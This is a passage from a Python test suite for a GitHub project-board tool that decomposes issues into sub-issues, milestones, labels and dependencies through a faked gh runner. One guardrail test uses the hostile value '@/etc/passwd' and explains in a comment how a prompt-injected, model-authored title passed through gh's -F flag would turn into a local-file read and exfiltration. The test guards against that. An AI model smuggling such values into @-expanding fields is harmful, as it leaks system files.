            plan.write_text("---\ntitle: t\n---\n\nbody\n", encoding="utf-8")
            (root / "s1.md").write_text("sub1", encoding="utf-8")
            (root / "s2.md").write_text("sub2", encoding="utf-8")
            spec = {"body_file": "docs/plans/p.md", "priority": "p2", "milestone": None, "sub_issues": [
                {"title": "core", "body_file": "s1.md"},
                {"title": "follow", "body_file": "s2.md", "blocked_by": [0]}]}
            spec_path = root / "spec.json"
            spec_path.write_text(json.dumps(spec), encoding="utf-8")

            runner = FakeRunner([
                (["project", "field-list", "1", "--owner", "o"], _decompose_field_list()),
                (["issue", "edit", "182", "--repo", "o/r", "--body-file"],
                 _ok("https://github.com/o/r/issues/182\n")),
                (["issue", "create", "--repo", "o/r", "--parent", "182", "--title", "core"],
                 _ok("https://github.com/o/r/issues/183\n")),
                (["issue", "create", "--repo", "o/r", "--parent", "182", "--title", "follow"],
                 _ok("https://github.com/o/r/issues/184\n")),
                (["issue", "edit", "184", "--repo", "o/r", "--add-blocked-by", "183"],
                 _ok("")),
            ])
            seen = {}
            deboarded = []

            def fake_set_status(parent, stage, ctx, run, force=False):
                seen["call"] = (parent, stage)
                return {"issue": parent, "stage": stage, "previous_stage": None}

            def fake_deboard(number, board, ctx, run):
                deboarded.append(number)
                return {"issue": number, "deboarded": False}

            with mock.patch.object(lb, "read_board_config",
                                   return_value=lb.BoardConfig(owner="o", number=1, source="committed")):
                out = lb.verb_decompose(182, str(spec_path), _ctx(str(root)), runner,
                                        set_status=fake_set_status, deboard=fake_deboard)

            self.assertEqual(out["parent"], 182)
            self.assertEqual(out["sub_issue_count"], 2)
            self.assertEqual([s["number"] for s in out["sub_issues"]], [183, 184])
            self.assertEqual(out["sub_issues"][1]["blocked_by"], [183])
            self.assertEqual(out["dependencies_wired"], 1)
            self.assertEqual(seen["call"], (182, "planned"))
            # every created sub-issue is best-effort de-boarded (the Project
            # tracks the parent), and the results ride the verb output.
            self.assertEqual(deboarded, [183, 184])
            self.assertEqual([d["issue"] for d in out["deboarded"]], [183, 184])
            # GitHub is canonical; the transient body input is never modified.
            self.assertEqual(plan.read_text(encoding="utf-8"), "---\ntitle: t\n---\n\nbody\n")
            # every queued gh response was consumed in the exact expected order
            self.assertEqual(runner.responses, [])

    def test_deboard_failure_is_reported_not_fatal(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            (root / "p.md").write_text("body", encoding="utf-8")
            (root / "s1.md").write_text("sub1", encoding="utf-8")
            spec = {"body_file": "p.md", "priority": "p2", "milestone": None, "sub_issues": [{"title": "core", "body_file": "s1.md"}]}
            spec_path = root / "spec.json"
            spec_path.write_text(json.dumps(spec), encoding="utf-8")
            runner = FakeRunner([
                (["project", "field-list", "1", "--owner", "o"], _decompose_field_list()),
                (["issue", "edit", "182", "--repo", "o/r", "--body-file"],
                 _ok("https://github.com/o/r/issues/182\n")),
                (["issue", "create", "--repo", "o/r", "--parent", "182", "--title", "core"],
                 _ok("https://github.com/o/r/issues/183\n")),
            ])

            def failing_deboard(number, board, ctx, run):
                return {"issue": number, "deboarded": False, "error": "archive blew up"}

            with mock.patch.object(lb, "read_board_config",
                                   return_value=lb.BoardConfig(owner="o", number=1, source="committed")):
                out = lb.verb_decompose(182, str(spec_path), _ctx(str(root)), runner,
                                        set_status=lambda *a, **k: {"stage": "planned",
                                                                    "previous_stage": None},
                                        deboard=failing_deboard)
            # non-fatal: the decomposition succeeds; the failure is reported.
            self.assertEqual(out["sub_issue_count"], 1)
            self.assertEqual(out["deboarded"][0]["error"], "archive blew up")

    def test_bad_spec_writes_nothing(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            spec_path = root / "spec.json"
            spec_path.write_text(json.dumps({"milestone": None, "sub_issues": []}), encoding="utf-8")  # no plan_path
            runner = FakeRunner([])  # must never be called
            with mock.patch.object(lb, "read_board_config",
                                   return_value=lb.BoardConfig(owner="o", number=1, source="committed")):
                with self.assertRaises(lb.BoardError) as cm:
                    lb.verb_decompose(182, str(spec_path), _ctx(str(root)), runner,
                                      set_status=lambda *a, **k: None)
            self.assertEqual(cm.exception.code, "invalid_decompose_spec")
            self.assertEqual(runner.calls, [])  # no gh writes on a malformed spec

    def test_existing_issue_blocked_by_is_preflighted_then_wired(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            (root / "p.md").write_text("parent", encoding="utf-8")
            (root / "s1.md").write_text("sub1", encoding="utf-8")
            (root / "s2.md").write_text("sub2", encoding="utf-8")
            spec = {"body_file": "p.md", "priority": "p2", "milestone": None, "sub_issues": [
                {"title": "core", "body_file": "s1.md"},
                {"title": "follow", "body_file": "s2.md", "blocked_by": [0, "#257"]}]}
            spec_path = root / "spec.json"
            spec_path.write_text(json.dumps(spec), encoding="utf-8")

            runner = FakeRunner([
                # existence check runs with the other preflights, BEFORE the
                # schema resolve and long before the first mutation
                (["issue", "view", "257", "--repo", "o/r", "--json", "number"],
                 _ok('{"number":257}')),
                (["project", "field-list", "1", "--owner", "o"], _decompose_field_list()),
                (["issue", "edit", "182", "--repo", "o/r", "--body-file"],
                 _ok("https://github.com/o/r/issues/182\n")),
                (["issue", "create", "--repo", "o/r", "--parent", "182", "--title", "core"],
                 _ok("https://github.com/o/r/issues/183\n")),
                (["issue", "create", "--repo", "o/r", "--parent", "182", "--title", "follow"],
                 _ok("https://github.com/o/r/issues/184\n")),
                (["issue", "edit", "184", "--repo", "o/r", "--add-blocked-by", "183"], _ok("")),
                (["issue", "edit", "184", "--repo", "o/r", "--add-blocked-by", "257"], _ok("")),
            ])

            with mock.patch.object(lb, "read_board_config",
                                   return_value=lb.BoardConfig(owner="o", number=1, source="committed")):
                out = lb.verb_decompose(182, str(spec_path), _ctx(str(root)), runner,
                                        set_status=lambda *a, **k: {"stage": "planned",
                                                                    "previous_stage": None},
                                        deboard=lambda n, b, c, r: {"issue": n, "deboarded": True})

            self.assertEqual(out["dependencies_wired"], 2)
            # both kinds resolve to literal issue numbers in the returned JSON
            self.assertEqual(out["sub_issues"][1]["blocked_by"], [183, 257])
            self.assertEqual(runner.responses, [])

    def test_closed_referenced_issue_is_a_satisfied_dependency(self) -> None:
        # `gh issue view` succeeds for a closed issue; the preflight checks
        # EXISTENCE only, so a closed blocker must not fail the decomposition.
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            (root / "p.md").write_text("parent", encoding="utf-8")
            (root / "s1.md").write_text("sub1", encoding="utf-8")
            spec = {"body_file": "p.md", "priority": "p2", "milestone": None, "sub_issues": [
                {"title": "core", "body_file": "s1.md", "blocked_by": ["257"]}]}
            spec_path = root / "spec.json"
            spec_path.write_text(json.dumps(spec), encoding="utf-8")
            runner = FakeRunner([
                (["issue", "view", "257", "--repo", "o/r", "--json", "number"],
                 _ok('{"number":257}')),
                (["project", "field-list", "1", "--owner", "o"], _decompose_field_list()),
                (["issue", "edit", "182", "--repo", "o/r", "--body-file"],
                 _ok("https://github.com/o/r/issues/182\n")),
                (["issue", "create", "--repo", "o/r", "--parent", "182", "--title", "core"],
                 _ok("https://github.com/o/r/issues/183\n")),
                (["issue", "edit", "183", "--repo", "o/r", "--add-blocked-by", "257"], _ok("")),
            ])
            with mock.patch.object(lb, "read_board_config",
                                   return_value=lb.BoardConfig(owner="o", number=1, source="committed")):
                out = lb.verb_decompose(182, str(spec_path), _ctx(str(root)), runner,
                                        set_status=lambda *a, **k: {"stage": "planned",
                                                                    "previous_stage": None},
                                        deboard=lambda n, b, c, r: {"issue": n, "deboarded": True})
            self.assertEqual(out["sub_issues"][0]["blocked_by"], [257])
            self.assertEqual(runner.responses, [])

    def test_missing_referenced_issue_writes_nothing(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            (root / "p.md").write_text("parent", encoding="utf-8")
            (root / "s1.md").write_text("sub1", encoding="utf-8")
            spec = {"body_file": "p.md", "priority": "p2", "milestone": None, "sub_issues": [
                {"title": "core", "body_file": "s1.md", "blocked_by": ["#999999"]}]}
            spec_path = root / "spec.json"
            spec_path.write_text(json.dumps(spec), encoding="utf-8")
            runner = FakeRunner([
                (["issue", "view", "999999", "--repo", "o/r", "--json", "number"],
                 subprocess.CompletedProcess(args=[], returncode=1, stdout="",
                                             stderr="Could not resolve to an Issue")),
            ])
            with mock.patch.object(lb, "read_board_config",
                                   return_value=lb.BoardConfig(owner="o", number=1, source="committed")):
                with self.assertRaises(lb.BoardError) as cm:
                    lb.verb_decompose(182, str(spec_path), _ctx(str(root)), runner,
                                      set_status=lambda *a, **k: None)
            self.assertEqual(cm.exception.code, "blocked_by_issue_missing")
            # the failing view is the ONLY gh call: nothing was created or edited
            self.assertEqual(len(runner.calls), 1)

    def test_index_only_spec_makes_no_existence_check(self) -> None:
        # Backward compatibility: an index-only spec produces exactly the argv
        # it produced before cross-issue blocked_by existed.
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            (root / "p.md").write_text("parent", encoding="utf-8")
            (root / "s1.md").write_text("sub1", encoding="utf-8")
            (root / "s2.md").write_text("sub2", encoding="utf-8")
            spec = {"body_file": "p.md", "priority": "p2", "milestone": None, "sub_issues": [
                {"title": "core", "body_file": "s1.md"},
                {"title": "follow", "body_file": "s2.md", "blocked_by": [0]}]}
            spec_path = root / "spec.json"
            spec_path.write_text(json.dumps(spec), encoding="utf-8")
            runner = FakeRunner([
                (["project", "field-list", "1", "--owner", "o"], _decompose_field_list()),
                (["issue", "edit", "182", "--repo", "o/r", "--body-file"],
                 _ok("https://github.com/o/r/issues/182\n")),
                (["issue", "create", "--repo", "o/r", "--parent", "182", "--title", "core"],
                 _ok("https://github.com/o/r/issues/183\n")),
                (["issue", "create", "--repo", "o/r", "--parent", "182", "--title", "follow"],
                 _ok("https://github.com/o/r/issues/184\n")),
                (["issue", "edit", "184", "--repo", "o/r", "--add-blocked-by", "183"], _ok("")),
            ])
            with mock.patch.object(lb, "read_board_config",
                                   return_value=lb.BoardConfig(owner="o", number=1, source="committed")):
                out = lb.verb_decompose(182, str(spec_path), _ctx(str(root)), runner,
                                        set_status=lambda *a, **k: {"stage": "planned",
                                                                    "previous_stage": None},
                                        deboard=lambda n, b, c, r: {"issue": n, "deboarded": True})
            self.assertEqual(out["sub_issues"][1]["blocked_by"], [183])
            self.assertNotIn("view", [c[1] for c in runner.calls])
            self.assertEqual(runner.responses, [])

    @staticmethod
    def _milestone_list(*rows: dict) -> "subprocess.CompletedProcess[str]":
        """`gh api --paginate --jq '.[] | {number, title, state}'` emits one
        JSON object per line — the shape resolve_milestone parses. Rows default
        to open, the only state gh's own --milestone resolver can assign to."""
        return _ok("".join(json.dumps({"state": "open", **r}) + "\n" for r in rows))

    _MILESTONE_LIST_ARGV = ["api", "--paginate", "--jq", ".[] | {number, title, state}",
                            "repos/o/r/milestones?state=all&per_page=100"]

    def _milestone_spec_dir(self, root: Path, milestone: dict) -> Path:
        (root / "p.md").write_text("parent", encoding="utf-8")
        (root / "s1.md").write_text("sub1", encoding="utf-8")
        spec = {"body_file": "p.md", "priority": "p2", "milestone": milestone,
                "sub_issues": [{"title": "core", "body_file": "s1.md"}]}
        spec_path = root / "spec.json"
        spec_path.write_text(json.dumps(spec), encoding="utf-8")
        return spec_path

    def _run_decompose(self, root: Path, spec_path: Path, runner) -> dict:
        with mock.patch.object(lb, "read_board_config",
                               return_value=lb.BoardConfig(owner="o", number=1, source="committed")):
            return lb.verb_decompose(182, str(spec_path), _ctx(str(root)), runner,
                                     set_status=lambda *a, **k: {"stage": "planned",
                                                                 "previous_stage": None},
                                     deboard=lambda n, b, c, r: {"issue": n, "deboarded": True})

    def test_absent_milestone_is_created_once_and_assigned_everywhere(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            spec_path = self._milestone_spec_dir(
                root, {"title": "Non-demo data", "description": "real sources"})
            runner = FakeRunner([
                (["project", "field-list", "1", "--owner", "o"], _decompose_field_list()),
                (self._MILESTONE_LIST_ARGV,
                 self._milestone_list({"number": 3, "title": "Something else"})),
                (["api", "repos/o/r/milestones", "-f", "title=Non-demo data",
                  "-f", "description=real sources"],
                 _ok('{"number": 7, "title": "Non-demo data"}')),
                (["issue", "edit", "182", "--repo", "o/r", "--body-file"],
                 _ok("https://github.com/o/r/issues/182\n")),
                (["issue", "create", "--repo", "o/r", "--parent", "182", "--title", "core"],
                 _ok("https://github.com/o/r/issues/183\n")),
            ])
            out = self._run_decompose(root, spec_path, runner)

            self.assertEqual(out["milestone"], {"title": "Non-demo data", "number": 7,
                                                "created": True})
            # membership rides --milestone on BOTH the parent edit and the sub create
            parent_edit = next(c for c in runner.calls if c[:3] == ["issue", "edit", "182"])
            sub_create = next(c for c in runner.calls if c[:2] == ["issue", "create"])
            for argv in (parent_edit, sub_create):
                self.assertIn("--milestone", argv)
                self.assertEqual(argv[argv.index("--milestone") + 1], "Non-demo data")
            self.assertEqual(runner.responses, [])

    def test_new_parent_create_also_carries_the_milestone(self) -> None:
        # The `issue is None` branch creates the parent instead of editing it.
        # Without this case, dropping *milestone_args from the parent CREATE
        # leaves every sub-issue in the milestone and the parent outside it,
        # with green tests and a silently wrong grouping.
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            (root / "p.md").write_text("parent", encoding="utf-8")
            (root / "s1.md").write_text("sub1", encoding="utf-8")
            spec = {"body_file": "p.md", "parent_title": "epic", "priority": "p2",
                    "milestone": {"title": "Non-demo data"},
                    "sub_issues": [{"title": "core", "body_file": "s1.md"}]}
            spec_path = root / "spec.json"
            spec_path.write_text(json.dumps(spec), encoding="utf-8")
            runner = FakeRunner([
                (["project", "field-list", "1", "--owner", "o"], _decompose_field_list()),
                (self._MILESTONE_LIST_ARGV,
                 self._milestone_list({"number": 7, "title": "Non-demo data"})),
                (["issue", "create", "--repo", "o/r", "--title", "epic"],
                 _ok("https://github.com/o/r/issues/182\n")),
                (["issue", "create", "--repo", "o/r", "--parent", "182", "--title", "core"],
                 _ok("https://github.com/o/r/issues/183\n")),
            ])
            with mock.patch.object(lb, "read_board_config",
                                   return_value=lb.BoardConfig(owner="o", number=1,
                                                               source="committed")):
                out = lb.verb_decompose(None, str(spec_path), _ctx(str(root)), runner,
                                        set_status=lambda *a, **k: {"stage": "planned",
                                                                    "previous_stage": None},
                                        deboard=lambda n, b, c, r: {"issue": n, "deboarded": True})
            self.assertEqual(out["parent"], 182)
            parent_create = next(c for c in runner.calls
                                 if c[:2] == ["issue", "create"] and "--parent" not in c)
            self.assertEqual(parent_create[parent_create.index("--milestone") + 1],
                             "Non-demo data")
            self.assertEqual(runner.responses, [])

    def test_near_miss_title_is_a_different_milestone(self) -> None:
        # Matching is EXACT. A case- or spacing-variant is a different epic, and
        # adopting it would silently file the work under the wrong grouping.
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            spec_path = self._milestone_spec_dir(root, {"title": "Non-demo data"})
            runner = FakeRunner([
                (["project", "field-list", "1", "--owner", "o"], _decompose_field_list()),
                (self._MILESTONE_LIST_ARGV,
                 self._milestone_list({"number": 3, "title": "Non-demo Data"},
                                      {"number": 4, "title": "non-demo data"},
                                      {"number": 5, "title": " Non-demo data"})),
                (["api", "repos/o/r/milestones", "-f", "title=Non-demo data"],
                 _ok('{"number": 9, "title": "Non-demo data"}')),
                (["issue", "edit", "182", "--repo", "o/r", "--body-file"],
                 _ok("https://github.com/o/r/issues/182\n")),
                (["issue", "create", "--repo", "o/r", "--parent", "182", "--title", "core"],
                 _ok("https://github.com/o/r/issues/183\n")),
            ])
            out = self._run_decompose(root, spec_path, runner)
            self.assertEqual(out["milestone"], {"title": "Non-demo data", "number": 9,
                                                "created": True})

    def test_closed_same_title_milestone_fails_before_any_write(self) -> None:
        # gh's own `--milestone <title>` resolver searches OPEN milestones only,
        # so silently "reusing" a closed one would blow up later as an opaque
        # issue-write failure. Diagnose it in preflight instead.
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            spec_path = self._milestone_spec_dir(root, {"title": "Non-demo data"})
            runner = FakeRunner([
                (["project", "field-list", "1", "--owner", "o"], _decompose_field_list()),
                (self._MILESTONE_LIST_ARGV,
                 self._milestone_list({"number": 7, "title": "Non-demo data",
                                       "state": "closed"})),
            ])
            with mock.patch.object(lb, "read_board_config",
                                   return_value=lb.BoardConfig(owner="o", number=1,
                                                               source="committed")):
                with self.assertRaises(lb.BoardError) as cm:
                    lb.verb_decompose(182, str(spec_path), _ctx(str(root)), runner,
                                      set_status=lambda *a, **k: None)
            self.assertEqual(cm.exception.code, "milestone_closed")
            self.assertNotIn("issue", [c[0] for c in runner.calls])

    def test_milestone_title_is_stripped_once_at_resolution(self) -> None:
        # A stray trailing space must not wedge the verb: the spec's title is
        # normalized once, so the list match, the POST, and the --milestone argv
        # all agree. Otherwise a retry POSTs a title GitHub already stores.
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            spec_path = self._milestone_spec_dir(root, {"title": "  Non-demo data  "})
            runner = FakeRunner([
                (["project", "field-list", "1", "--owner", "o"], _decompose_field_list()),
                (self._MILESTONE_LIST_ARGV,
                 self._milestone_list({"number": 7, "title": "Non-demo data"})),
                (["issue", "edit", "182", "--repo", "o/r", "--body-file"],
                 _ok("https://github.com/o/r/issues/182\n")),
                (["issue", "create", "--repo", "o/r", "--parent", "182", "--title", "core"],
                 _ok("https://github.com/o/r/issues/183\n")),
            ])
            out = self._run_decompose(root, spec_path, runner)
            self.assertEqual(out["milestone"], {"title": "Non-demo data", "number": 7,
                                                "created": False})
            for argv in runner.calls:
                if "--milestone" in argv:
                    self.assertEqual(argv[argv.index("--milestone") + 1], "Non-demo data")

    def test_existing_milestone_is_reused_without_a_second_create(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            spec_path = self._milestone_spec_dir(root, {"title": "Non-demo data"})
            runner = FakeRunner([
                (["project", "field-list", "1", "--owner", "o"], _decompose_field_list()),
                (self._MILESTONE_LIST_ARGV,
                 self._milestone_list({"number": 3, "title": "Other"},
                                      {"number": 7, "title": "Non-demo data"})),
                (["issue", "edit", "182", "--repo", "o/r", "--body-file"],
                 _ok("https://github.com/o/r/issues/182\n")),
                (["issue", "create", "--repo", "o/r", "--parent", "182", "--title", "core"],
                 _ok("https://github.com/o/r/issues/183\n")),
            ])
            out = self._run_decompose(root, spec_path, runner)
            self.assertEqual(out["milestone"], {"title": "Non-demo data", "number": 7,
                                                "created": False})
            # re-running the same spec must never POST a second milestone
            self.assertNotIn(["api", "repos/o/r/milestones"],
                             [c[:2] for c in runner.calls])
            self.assertEqual(runner.responses, [])

    def test_at_prefixed_spec_values_are_sent_literally_never_read_from_disk(self) -> None:
        # GUARDRAIL — freeze the category (which gh field flag carries untrusted
        # bytes), not the surrounding argv spelling.
        #
        # A milestone title/description is the first model-authored free-text
        # value this engine sends to `gh api` as a request field; every other
        # field call site carries git-derived scalars. gh's -F/--field expands a
        # leading `@` into a FILE READ, while -f/--raw-field sends bytes
        # literally. Grooming reads issue text, which the workflow treats as
        # untrusted, so a -f -> -F swap here turns a prompt-injected spec title
        # into local-file exfiltration with no error and no log entry.
        # See docs/solutions/security-issues/
        #     model-authored-strings-must-reach-gh-api-as-raw-fields.md
        hostile = "@/etc/passwd"
        runner = FakeRunner([
            (self._MILESTONE_LIST_ARGV, self._milestone_list()),
            (["api", "repos/o/r/milestones"], _ok('{"number": 9}')),
        ])
        lb.resolve_milestone({"title": hostile, "description": hostile}, _ctx("/tmp"), runner)
        create = runner.calls[-1]
        # the literal value reaches argv unchanged...
        self.assertIn(f"title={hostile}", create)
        self.assertIn(f"description={hostile}", create)
        # ...and no @-expanding flag carries a spec-authored value.
        for flag, value in zip(create, create[1:]):
            if flag in ("-F", "--field"):
                self.assertNotIn(hostile, value,
                                 "spec-authored values must ride -f/--raw-field: "
                                 "-F applies @-prefix file expansion")

    def test_invalid_milestone_object_makes_no_gh_call_at_all(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            spec_path = self._milestone_spec_dir(root, {"titel": "typo"})
            runner = FakeRunner([])  # must never be called
            with mock.patch.object(lb, "read_board_config",
                                   return_value=lb.BoardConfig(owner="o", number=1,
                                                               source="committed")):
                with self.assertRaises(lb.BoardError) as cm:
                    lb.verb_decompose(182, str(spec_path), _ctx(str(root)), runner,
                                      set_status=lambda *a, **k: None)
            self.assertEqual(cm.exception.code, "invalid_decompose_spec")
            self.assertEqual(runner.calls, [])

    def test_milestone_list_failure_writes_nothing(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            spec_path = self._milestone_spec_dir(root, {"title": "Non-demo data"})
            runner = FakeRunner([
                (["project", "field-list", "1", "--owner", "o"], _decompose_field_list()),
                (self._MILESTONE_LIST_ARGV,
                 subprocess.CompletedProcess(args=[], returncode=1, stdout="",
                                             stderr="HTTP 404")),
            ])
            with mock.patch.object(lb, "read_board_config",
                                   return_value=lb.BoardConfig(owner="o", number=1,
                                                               source="committed")):
                with self.assertRaises(lb.BoardError) as cm:
                    lb.verb_decompose(182, str(spec_path), _ctx(str(root)), runner,
                                      set_status=lambda *a, **k: None)
            self.assertEqual(cm.exception.code, "milestone_list_failed")
            self.assertNotIn("issue", [c[0] for c in runner.calls])

    def test_omitted_milestone_leaves_argv_untouched(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            (root / "p.md").write_text("parent", encoding="utf-8")
            (root / "s1.md").write_text("sub1", encoding="utf-8")
            spec = {"body_file": "p.md", "priority": "p2",
                    "milestone": None, "sub_issues": [{"title": "core", "body_file": "s1.md"}]}
            spec_path = root / "spec.json"
            spec_path.write_text(json.dumps(spec), encoding="utf-8")
            runner = FakeRunner([
                (["project", "field-list", "1", "--owner", "o"], _decompose_field_list()),
                (["issue", "edit", "182", "--repo", "o/r", "--body-file"],
                 _ok("https://github.com/o/r/issues/182\n")),
                (["issue", "create", "--repo", "o/r", "--parent", "182", "--title", "core"],
                 _ok("https://github.com/o/r/issues/183\n")),
            ])
            out = self._run_decompose(root, spec_path, runner)
            self.assertIsNone(out["milestone"])
            for argv in runner.calls:
                self.assertNotIn("--milestone", argv)
            self.assertEqual(runner.responses, [])

    def test_missing_later_sub_body_is_preflighted_before_parent_write(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            (root / "parent.md").write_text("parent", encoding="utf-8")
            (root / "s1.md").write_text("first", encoding="utf-8")
            spec = {"body_file": "parent.md", "priority": "p2", "milestone": None, "sub_issues": [
                {"title": "first", "body_file": "s1.md"},
                {"title": "missing", "body_file": "s2.md"}]}
            spec_path = root / "spec.json"
            spec_path.write_text(json.dumps(spec), encoding="utf-8")
            runner = FakeRunner([])
            with mock.patch.object(lb, "read_board_config",
                                   return_value=lb.BoardConfig(owner="o", number=1,
                                                               source="committed")):
                with self.assertRaises(lb.BoardError) as caught:
                    lb.verb_decompose(182, str(spec_path), _ctx(str(root)), runner,
                                      set_status=lambda *a, **k: None)
            self.assertEqual(caught.exception.code, "sub_body_missing")
            self.assertEqual(runner.calls, [])

    def test_mixed_tier_complexity_labels_applied_with_parent_rollup(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            (root / "parent.md").write_text("parent", encoding="utf-8")
            (root / "s1.md").write_text("sub1", encoding="utf-8")
            (root / "s2.md").write_text("sub2", encoding="utf-8")
            # Parent spec-level complexity is `low`, but children are high+low, so
            # the parent ROLLUP must be `high` (max child), not the spec-level value.
            spec = {"body_file": "parent.md", "priority": "p2", "complexity": "low", "milestone": None, "sub_issues": [
                {"title": "core", "body_file": "s1.md", "complexity": "high"},
                {"title": "follow", "body_file": "s2.md", "blocked_by": [0], "complexity": "low"}]}
            spec_path = root / "spec.json"
            spec_path.write_text(json.dumps(spec), encoding="utf-8")

            runner = FakeRunner([
                (["project", "field-list", "1", "--owner", "o"], _decompose_field_list()),
                (["issue", "edit", "182", "--repo", "o/r", "--body-file"],
                 _ok("https://github.com/o/r/issues/182\n")),
                (["issue", "create", "--repo", "o/r", "--parent", "182", "--title", "core"],
                 _ok("https://github.com/o/r/issues/183\n")),
                (["issue", "create", "--repo", "o/r", "--parent", "182", "--title", "follow"],
                 _ok("https://github.com/o/r/issues/184\n")),
                (["issue", "edit", "184", "--repo", "o/r", "--add-blocked-by", "183"], _ok("")),
                # sub 183 -> complexity:high
                (["issue", "view", "183", "--repo", "o/r", "--json", "labels"], _ok('{"labels":[]}')),
                (["label", "create", "complexity:high", "--repo", "o/r"], _ok("")),
                (["issue", "edit", "183", "--repo", "o/r", "--add-label", "complexity:high"], _ok("")),
                # sub 184 -> complexity:low
                (["issue", "view", "184", "--repo", "o/r", "--json", "labels"], _ok('{"labels":[]}')),
                (["label", "create", "complexity:low", "--repo", "o/r"], _ok("")),
                (["issue", "edit", "184", "--repo", "o/r", "--add-label", "complexity:low"], _ok("")),
                # parent rollup -> complexity:high (max child)
                (["issue", "view", "182", "--repo", "o/r", "--json", "labels"], _ok('{"labels":[]}')),
                (["label", "create", "complexity:high", "--repo", "o/r"], _ok("")),
                (["issue", "edit", "182", "--repo", "o/r", "--add-label", "complexity:high"], _ok("")),
            ])
            seen = {}

            def fake_set_status(parent, stage, ctx, run, force=False):
                seen["call"] = (parent, stage)
                return {"issue": parent, "stage": stage, "previous_stage": None}

            with mock.patch.object(lb, "read_board_config",
                                   return_value=lb.BoardConfig(owner="o", number=1, source="committed")):
                out = lb.verb_decompose(182, str(spec_path), _ctx(str(root)), runner,
                                        set_status=fake_set_status,
                                        deboard=lambda number, board, ctx, run: {"issue": number, "deboarded": False})

            # AC3: parent label = highest child tier; AC5: planned still stamped.
            self.assertEqual(out["parent_complexity"], "high")
            self.assertEqual([s["complexity"] for s in out["sub_issues"]], ["high", "low"])
            self.assertEqual(seen["call"], (182, "planned"))
            self.assertEqual(runner.responses, [])  # every label call consumed in order

    def test_single_task_parent_uses_own_complexity(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            (root / "parent.md").write_text("parent", encoding="utf-8")
            spec = {"body_file": "parent.md", "priority": "p2", "complexity": "medium", "milestone": None, "sub_issues": []}
            spec_path = root / "spec.json"
            spec_path.write_text(json.dumps(spec), encoding="utf-8")

            runner = FakeRunner([
                (["project", "field-list", "1", "--owner", "o"], _decompose_field_list()),
                (["issue", "edit", "182", "--repo", "o/r", "--body-file"],
                 _ok("https://github.com/o/r/issues/182\n")),
                # single-task: parent takes its own spec-level complexity
                (["issue", "view", "182", "--repo", "o/r", "--json", "labels"], _ok('{"labels":[]}')),
                (["label", "create", "complexity:medium", "--repo", "o/r"], _ok("")),
                (["issue", "edit", "182", "--repo", "o/r", "--add-label", "complexity:medium"], _ok("")),
            ])
            with mock.patch.object(lb, "read_board_config",
                                   return_value=lb.BoardConfig(owner="o", number=1, source="committed")):
                out = lb.verb_decompose(182, str(spec_path), _ctx(str(root)), runner,
                                        set_status=lambda p, s, c, r, force=False: {"stage": s},
                                        deboard=lambda number, board, ctx, run: {"issue": number, "deboarded": False})
            self.assertEqual(out["parent_complexity"], "medium")
            self.assertEqual(runner.responses, [])

    def test_posture_write_is_ordered_after_set_status(self) -> None:
        # AC8: the posture write must be observably ordered AFTER
        # set_status(parent, "planned") — a label write must never gate or
        # break the `planned` transition. apply_posture_label is spied (not
        # exercised for real here — its own behavior is covered by
        # PostureLabelWriterTest) purely to capture ordering.
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            (root / "parent.md").write_text("parent", encoding="utf-8")
            spec = {"body_file": "parent.md", "priority": "p2", "posture": "autonomous", "milestone": None, "sub_issues": []}
            spec_path = root / "spec.json"
            spec_path.write_text(json.dumps(spec), encoding="utf-8")

            order = []

            def fake_set_status(parent, stage, ctx, run, force=False):
                order.append("set_status")
                return {"issue": parent, "stage": stage, "previous_stage": None, "item_id": "IT_1"}

            def fake_apply_posture(issue, posture, ctx, runner):
                order.append("posture")
                return {"issue": issue, "posture": posture, "label": "posture:autonomous",
                        "removed_labels": []}

            def fake_apply_priority(item_id, value, schema, runner):
                order.append("priority")
                return {"item_id": item_id, "priority": value}

            runner = FakeRunner([
                (["project", "field-list", "1", "--owner", "o"], _decompose_field_list()),
                (["issue", "edit", "182", "--repo", "o/r", "--body-file"],
                 _ok("https://github.com/o/r/issues/182\n")),
            ])
            self._priority_patch.stop()
            with mock.patch.object(lb, "read_board_config",
                                   return_value=lb.BoardConfig(owner="o", number=1, source="committed")), \
                 mock.patch.object(lb, "apply_posture_label", side_effect=fake_apply_posture), \
                 mock.patch.object(lb, "apply_priority_field", side_effect=fake_apply_priority):
                out = lb.verb_decompose(182, str(spec_path), _ctx(str(root)), runner,
                                        set_status=fake_set_status,
                                        deboard=lambda number, board, ctx, run: {"issue": number, "deboarded": False})
            self.assertEqual(order, ["set_status", "priority", "posture"])
            self.assertEqual(out["parent_posture"], "autonomous")
            self.assertEqual(out["parent_priority"], "p2")

    def test_priority_write_uses_item_id_from_set_status(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            (root / "parent.md").write_text("parent", encoding="utf-8")
            spec = {"body_file": "parent.md", "priority": "p1", "milestone": None, "sub_issues": []}
            spec_path = root / "spec.json"
            spec_path.write_text(json.dumps(spec), encoding="utf-8")

            seen = {}

            def fake_set_status(parent, stage, ctx, run, force=False):
                return {"issue": parent, "stage": stage, "previous_stage": None, "item_id": "IT_FROM_STATUS"}

            def fake_apply_priority(item_id, value, schema, runner):
                seen["call"] = (item_id, value, schema.priority_field_id)
                return {"item_id": item_id, "priority": value}

            runner = FakeRunner([
                (["project", "field-list", "1", "--owner", "o"], _decompose_field_list()),
                (["issue", "edit", "182", "--repo", "o/r", "--body-file"],
                 _ok("https://github.com/o/r/issues/182\n")),
            ])
            self._priority_patch.stop()
